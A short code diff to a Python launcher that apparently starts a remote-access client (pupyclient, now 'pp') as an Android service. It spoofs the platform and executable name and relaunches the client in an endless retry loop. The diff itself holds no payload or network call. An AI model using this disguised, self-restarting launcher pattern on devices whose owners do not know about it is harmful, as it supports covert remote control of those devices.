@@ -11,13 +11,15 @@ os.environ['KIVY_NO_FILELOG'] = 'yes'
 platform.system = lambda: 'android'
 
 if __name__ == '__main__':
-    import pupyclient
     import sys
     setattr(sys, 'executable', 'PythonService')
+
+    import pp
+
     while True:
         try:
-            pupyclient.__main__()
-        except Exception, e:
+            pp.main(debug=True)
+        except Exception as e:
             import traceback
-            traceback.print_exc(e)
+            traceback.print_exc()
             time.sleep(10)
